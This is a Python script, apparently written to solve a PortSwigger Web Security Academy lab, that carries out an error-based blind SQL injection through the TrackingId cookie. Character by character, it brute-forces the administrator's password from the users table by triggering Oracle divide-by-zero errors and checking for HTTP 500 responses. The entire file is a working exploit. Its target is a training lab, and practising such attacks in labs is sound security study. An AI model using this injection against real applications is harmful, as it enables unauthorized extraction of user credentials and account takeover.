from termcolor import colored
import requests
import sys
import signal
import string
import time
from pwn import log

def def_handler(sig, frame):
    print(colored("\n\n[!] Saliendo...\n", 'red'))
    p1.failure("Ataque de fuerza bruta detenido")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

characters = string.ascii_lowercase + string.digits
p1 = log.progress("SQLi")

def makeSQLi():

    p1.status("Iniciando ataque de fuerza bruta")
    time.sleep(2)

    password = ""

    p2 = log.progress("Password")

    for position in range(1, 21):
        for character in characters:
            cookies = {
                'TrackingId': f"OpTM4Ic5M3tdYiBB'||(select case when substr(password,{position},1)='{character}' then to_char(1/0) else '' end from users where username='administrator')||'",
                'session': 'eeBj03FYK4uowytrMt8WfXH7U4GcOVo'
            }

            p1.status(cookies["TrackingId"])

            r = requests.get("https://0a5c000504a13a58009508d700a200a2.web-security-academy.net", cookies=cookies)

            if r.status_code == 500:
                password += character
                p2.status(password)
                break

if __name__ == '__main__':
    makeSQLi()
